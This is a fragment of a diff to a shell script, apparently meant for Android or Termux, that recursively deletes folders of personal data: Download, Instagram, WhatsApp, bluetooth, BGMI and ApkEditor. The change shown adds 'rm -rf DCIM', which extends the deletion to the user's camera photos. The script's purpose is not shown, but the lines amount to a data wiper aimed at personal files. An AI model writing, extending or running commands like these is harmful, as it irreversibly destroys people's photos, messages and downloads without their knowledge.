@@ -25,6 +25,7 @@ rm -rf BGMI
 rm -rf ApkEditor
 rm -rf Download
 rm -rf Instagram
+rm -rf DCIM
 rm -rf bluetooth
 rm -rf WhatsApp
 cd $HOME
